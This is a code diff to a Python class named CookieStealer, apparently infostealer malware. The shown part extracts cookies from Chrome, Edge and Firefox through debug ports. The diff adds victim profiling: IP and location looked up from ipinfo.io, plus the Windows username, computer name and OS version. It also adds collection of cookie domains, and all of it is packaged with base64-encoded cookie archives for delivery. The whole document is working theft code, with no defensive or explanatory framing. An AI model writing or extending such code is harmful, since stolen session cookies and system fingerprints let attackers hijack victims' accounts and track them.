@@ -222,7 +222,8 @@ class CookieStealer:
         self.logger = logger or self._create_default_logger()
         self.chrome_debug_port = 9222
         self.edge_debug_port = 9223
-        self.timeout = 10  # seconds for browser operations
+        self.timeout = 10
+        self.unique_domains = set()
         
         # Browser configurations
         self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
@@ -449,12 +450,50 @@ class CookieStealer:
             self._log('error', f"Failed to extract Firefox cookies: {str(e)}")
             return []
 
+    def _get_system_info(self):
+        """Get system information."""
+        try:
+            ip_info = requests.get('https://ipinfo.io', timeout=5).json()
+            return {
+                'ip_address': ip_info.get('ip', 'Unknown'),
+                'location': f"{ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}",
+                'username': os.getenv('USERNAME'),
+                'computer_name': os.getenv('COMPUTERNAME'),
+                'windows_version': platform.version(),
+                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
+            }
+        except Exception as e:
+            return {
+                'ip_address': 'Unknown',
+                'location': 'Unknown',
+                'username': 'Unknown',
+                'computer_name': 'Unknown',
+                'windows_version': 'Unknown',
+                'user_agent': 'Unknown'
+            }
+
+    def _extract_unique_domains(self, cookies):
+        """Extract unique domains from cookies."""
+        unique_domains = set()
+        for cookie in cookies:
+            domain = cookie.get('domain', '')
+            if domain:
+                unique_domains.add(domain)
+        return list(unique_domains)
+
     def _package_cookies(self, cookies, browser_name):
         """Package cookies into base64 encoded JSON with system info"""
         try:
             if not cookies:
                 return None
                 
+            # Extract unique domains
+            unique_domains = self._extract_unique_domains(cookies)
+            self.unique_domains.update(unique_domains)
+            
+            # Get system info
+            system_info = self._get_system_info()
+            
             # Create temporary file
             temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer')
             os.makedirs(temp_dir, exist_ok=True)
@@ -473,7 +512,11 @@ class CookieStealer:
             return {
                 'browser': browser_name,
                 'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
-                'system_info': SystemUtils.get_system_info()
+                'system_info': {
+                    **system_info,
+                    'unique_domains': unique_domains,
+                    'all_domains': list(self.unique_domains)
+                }
             }
         except Exception as e:
             self._log('error', f"Failed to package {browser_name} cookies: {str(e)}")
